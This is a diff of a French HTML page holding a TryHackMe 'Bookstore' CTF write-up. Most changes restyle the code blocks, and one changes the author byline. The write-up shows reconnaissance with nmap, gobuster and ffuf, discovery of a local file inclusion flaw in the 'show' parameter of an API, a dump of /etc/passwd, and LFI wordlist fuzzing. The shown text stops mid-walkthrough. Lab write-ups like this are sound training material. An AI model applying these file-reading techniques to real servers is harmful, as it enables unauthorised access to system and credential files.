@@ -1,14 +1,15 @@
 <!DOCTYPE html>
+
 <html lang="fr">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Bookstore - TryHackMe | Alex171</title>
-  <meta name="description" content="Writeup exhaustif et complet"/>
-  <link rel="stylesheet" href="../css/style.css"/>
-  <link rel="stylesheet" href="../css/animations.css"/>
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>"/>
-  <style>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Bookstore - TryHackMe | Alex171</title>
+<meta content="Writeup exhaustif et complet" name="description"/>
+<link href="../css/style.css" rel="stylesheet"/>
+<link href="../css/animations.css" rel="stylesheet"/>
+<link href="data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'&gt;&lt;text y='.9em' font-size='90'&gt;🔐&lt;/text&gt;&lt;/svg&gt;" rel="icon"/>
+<style>
     /* Styling adjustments for exhaustive content */
     .writeup-content img { max-width: 100%; border-radius: 8px; margin: 1.5rem 0; border: 1px solid var(--border); }
     .writeup-content blockquote { border-left: 3px solid var(--green); padding-left: 1rem; color: var(--text-muted); margin: 1.5rem 0; font-style: italic; }
@@ -23,53 +24,47 @@
 <body>
 <canvas id="matrix-canvas"></canvas><div class="grid-bg"></div>
 <nav class="navbar">
-  <a class="nav-logo" href="../index">&gt;_<span> alex171</span></a>
-  <div class="nav-links">
-    <a href="../index">Accueil</a><a href="../about">À propos</a>
-    <a href="../writeups" class="active">Writeups</a><a href="../certifications">Certifications</a>
-    <a href="../projects">Projets</a><a href="../resources">Ressources</a>
-  </div>
-  <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
+<a class="nav-logo" href="../index">&gt;_<span> alex171</span></a>
+<div class="nav-links">
+<a href="../index">Accueil</a><a href="../about">À propos</a>
+<a class="active" href="../writeups">Writeups</a><a href="../certifications">Certifications</a>
+<a href="../projects">Projets</a><a href="../resources">Ressources</a>
+</div>
+<div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
 </nav>
 <div class="mobile-menu" id="mobile-menu">
-  <a href="../index">Accueil</a><a href="../writeups">Writeups</a>
-  <a href="../certifications">Certifications</a><a href="../resources">Ressources</a>
+<a href="../index">Accueil</a><a href="../writeups">Writeups</a>
+<a href="../certifications">Certifications</a><a href="../resources">Ressources</a>
 </div>
-
 <main>
 <section class="section">
 <div class="container">
-  <div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;" class="fade-in">
-    <a href="../index" style="color:var(--text-muted);">~</a> / <a href="../writeups" style="color:var(--text-muted);">writeups</a> / <span style="color:var(--green);">bookstore</span>
-  </div>
-  <div class="writeup-layout">
-    <article class="writeup-content fade-in">
-      <div style="margin-bottom:2rem;">
-        <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
-          <span class="tag">Linux</span><span class="tag blue">Web</span><span class="tag purple">API</span><span class="tag">SQL Injection</span><span class="tag blue">Privilege Escalation</span>
-        </div>
-        <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">Bookstore - TryHackMe</h1>
-        <div style="font-family:var(--font-mono);font-size:0.85rem;color:var(--text-muted);margin-bottom:2rem;">
-            Publié le 2026-02-03 • TryHackMe
-        </div>
-      </div>
+<div class="fade-in" style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;"><a href="../index" style="color:var(--text-muted);">Home</a> &gt; TryHackMe: <span style="color:var(--green);">Bookstore</span></div>
+<div class="writeup-layout">
+<article class="writeup-content fade-in">
+<div style="margin-bottom:2rem;">
+<div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
+<span class="tag">Linux</span><span class="tag blue">Web</span><span class="tag purple">API</span><span class="tag">SQL Injection</span><span class="tag blue">Privilege Escalation</span>
+</div>
+<h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">Bookstore - TryHackMe</h1>
 
-      <p><strong>Objectif</strong>: Exploiter une faille dans une api rest pour avoir un accès à la machine cible puis réaliser une escalade de privilèges</p>
+<div style="display: flex; gap: 1rem; align-items: center; color: var(--text-muted); font-size: 0.9rem; margin-bottom: 2rem;"><img alt="jaxafed" src="/assets/images/avatar.jpg" style="width:30px; height:30px; border-radius:50%; margin:0;"/><span>By <strong>jaxafed</strong> • 9 min read</span></div></div>
+<p><strong>Objectif</strong>: Exploiter une faille dans une api rest pour avoir un accès à la machine cible puis réaliser une escalade de privilèges</p>
 <h2 id="configuration">Configuration</h2>
 <p>Nous allons associer l’ip cible au nom de domaine <code>bookstore.thm</code> en modifiant le fichier <code>/etc/hosts</code></p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">echo "IP_SERVEUR bookstore.thm" &gt;&gt; /etc/hosts</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">echo "IP_SERVEUR bookstore.thm" &gt;&gt; /etc/hosts</span>
+</code></code></pre></div></div>
 <h2 id="enumeration">Enumération</h2>
 <p>Nous allons scanner les ports ouverts via <code>nmap</code></p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">nmap -sC -sV -sS bookstore.thm</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">nmap -sC -sV -sS bookstore.thm</span>
+</code></code></pre></div></div>
 <p>On a le résultat suivant</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">PORT     STATE SERVICE VERSION</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">PORT     STATE SERVICE VERSION</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+</code></code></pre></div></div>
 <p>Ports ouverts :</p>
 <ul>
 <li>Port SHH(22)</li>
@@ -80,39 +75,39 @@
 <p>En nous rendant à la page d’acceuil <code>http://bookstore.thm</code> on a la page suivante</p>
 <p><img alt="image.png" src="attachment:dca97124-ff10-4010-87fb-ac0c677c277c:image.png"/></p>
 <p>Nous allons lister les dossiers cachés à l’aide de <code>gobuster</code></p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://bookstore.thm</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://bookstore.thm</span>
+</code></code></pre></div></div>
 <p>Le résultat est :</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Gobuster v3.8</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Url:                     http://bookstore.thm</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Method:                  GET</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Threads:                 10</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Negative Status codes:   404</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] User Agent:              gobuster/3.8</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">[+] Timeout:                 10s</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Starting gobuster in directory enumeration mode</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/.hta                 (Status: 403) [Size: 278]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/.htpasswd            (Status: 403) [Size: 278]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/.htaccess            (Status: 403) [Size: 278]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/assets               (Status: 301) [Size: 315] [--&gt; http://bookstore.thm/assets/]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/favicon.ico          (Status: 200) [Size: 15406]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/images               (Status: 301) [Size: 315] [--&gt; http://bookstore.thm/images/]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/index.html           (Status: 200) [Size: 6452]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/javascript           (Status: 301) [Size: 319] [--&gt; http://bookstore.thm/javascript/]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">/server-status        (Status: 403) [Size: 278]</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Progress: 4085 / 4750 (86.00%)[ERROR] error on word sysuser: timeout occurred during the request</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Progress: 4750 / 4750 (100.00%)</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">===============================================================</span>
-<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Finished</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Gobuster v3.8</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Url:                     http://bookstore.thm</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Method:                  GET</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Threads:                 10</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Negative Status codes:   404</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] User Agent:              gobuster/3.8</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">[+] Timeout:                 10s</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Starting gobuster in directory enumeration mode</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/.hta                 (Status: 403) [Size: 278]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/.htpasswd            (Status: 403) [Size: 278]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/.htaccess            (Status: 403) [Size: 278]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/assets               (Status: 301) [Size: 315] [--&gt; http://bookstore.thm/assets/]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/favicon.ico          (Status: 200) [Size: 15406]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/images               (Status: 301) [Size: 315] [--&gt; http://bookstore.thm/images/]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/index.html           (Status: 200) [Size: 6452]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/javascript           (Status: 301) [Size: 319] [--&gt; http://bookstore.thm/javascript/]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">/server-status        (Status: 403) [Size: 278]</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Progress: 4085 / 4750 (86.00%)[ERROR] error on word sysuser: timeout occurred during the request</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Progress: 4750 / 4750 (100.00%)</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">===============================================================</span>
+<span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">Finished</span>
+</code></code></pre></div></div>
 <p>Le résultat montre la présence du dossier <code>assets</code>. En l’explorant on tombe sur le dossier <code>js</code> contenant le fichier <code>api.js</code> dont le contenu est </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">jsx</span><button class="copy-btn">Copier</button></div><pre><code class="language-jsx">function getAPIURL() {
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">jsx</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-jsx"><code class="language-jsx">function getAPIURL() {
 var str = window.location.hostname;
 str = str + ":5000"
 return str;
@@ -149,14 +144,14 @@ async function renderUsers() {
 }
 renderUsers();
 //the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
-</code></pre></div>
+</code></code></pre></div></div>
 <p>Intéressant! Le commentaire de fin laisse présager que les versions précédentes de l’api contiennent un paramètre vulnérable à un local file inclusion alors que la nouvelle version est plus sécurisée. Cette information nous seras utile plus tard. </p>
 <p>En attendant explorons le service tournant sur le port 5000 via <code>http://bookstore.thm:5000</code> </p>
 <p>Il s’agit de la page d’accueil de l’api rest foxy. Nous pouvons essayer de lister les dossiers cachés</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">jsx</span><button class="copy-btn">Copier</button></div><pre><code class="language-jsx">gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://bookstore.thm:5000
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">jsx</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-jsx"><code class="language-jsx">gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://bookstore.thm:5000
+</code></code></pre></div></div>
 <p>On a le résultat:</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">jsx</span><button class="copy-btn">Copier</button></div><pre><code class="language-jsx">===============================================================
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">jsx</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-jsx"><code class="language-jsx">===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 ===============================================================
@@ -176,9 +171,9 @@ Starting gobuster in directory enumeration mode
 ===============================================================
 Finished
 ===============================================================
-</code></pre></div>
+</code></code></pre></div></div>
 <p>En nous rendant sur <code>http://boockstore.thm:5000/console</code> un code secret nous est demandé. Etant donné qu’on n’a pas le code on passé à /api. Il s’agit de la documentation de l’API  v2</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>API Documentation
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>API Documentation
 Since every good API has a documentation we have one as well!
 The various routes this API currently provides are:
 
@@ -193,18 +188,18 @@ The various routes this API currently provides are:
 /api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)
 
 /api/v2/resources/books?author=J.K. Rowling&amp;published=2003 (Search by a combination of 2 or more parameters)
-</code></pre></div>
+</code></code></pre></div></div>
 <p>L’api nous permet d’inclure des paramètres dans la requêtes. Or souvenons nous qu’il nous  a été dis qu’un paramètre de l’ancienne version de l’api est vulnérable à une locale file inclusion. Vu qu’on est sur la version 2, la version non sécurisée devrait être la version1. Essayons de lister les paramètres disponibles via <code>ffuf</code></p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ffuf -c -u "http://bookstore.thm:5000/api/v1/resources/books?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ffuf -c -u "http://bookstore.thm:5000/api/v1/resources/books?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200</span>
+</code></code></pre></div></div>
 <p>Résultat: </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>author
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>author
 id
 published
 show
-</code></pre></div>
+</code></code></pre></div></div>
 <p>Le paramètre <code>show</code> semble interessant. Essayons de vérifier si il est vulnérable en lisant le fichier <code>/etc/passwd</code> </p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>root:x:0:0:root:/root:/bin/bash
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">console</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class=""><code>root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
@@ -234,14 +229,14 @@ landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
 pollinate:x:109:1::/var/cache/pollinate:/bin/false
 sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
 sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
-</code></pre></div>
+</code></code></pre></div></div>
 <p>C’est une pépite on peut lire ce fichier ce qui confirme que ce paramètre est vulnérable à une LFI.</p>
 <h2 id="exploitation-de-la-lfi">Exploitation de la LFI</h2>
 <p>Le paramètre show est vulnérable et permet d’inclure un fichier et de le lire.Mais en essayant de lire le fichier <code>/etc/shadow</code> on obtient une erreur <code>500 filename not defined.</code> Ainsi le serveur filtre les fichiers en se basant sur une blackliste. Essayons de trouver les fichiers autorisés</p>
-<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ffuf -c -u "http://bookstore.thm:5000/api/v1/resources/books?show=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200</span>
-</code></pre></div>
+<div class="terminal-window" style="margin-bottom: 2rem; position: relative;"><div class="terminal-titlebar"><div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div><span class="terminal-title">bash</span><button class="copy-btn" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">Copier</button></div><div class="term-interactive-body" style="padding: 1rem; overflow-x: auto; background: var(--bg-tertiary); max-height: none;"><pre style="margin: 0;"><code class="language-bash"><code class="language-bash"><span class="t-prompt" style="color:var(--green); margin-right: 0.5rem;">$</span> <span class="hl-bash">ffuf -c -u "http://bookstore.thm:5000/api/v1/resources/books?show=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200</span>
+</code></code></pre></div></div>
 <p>On a les fichiers</p>
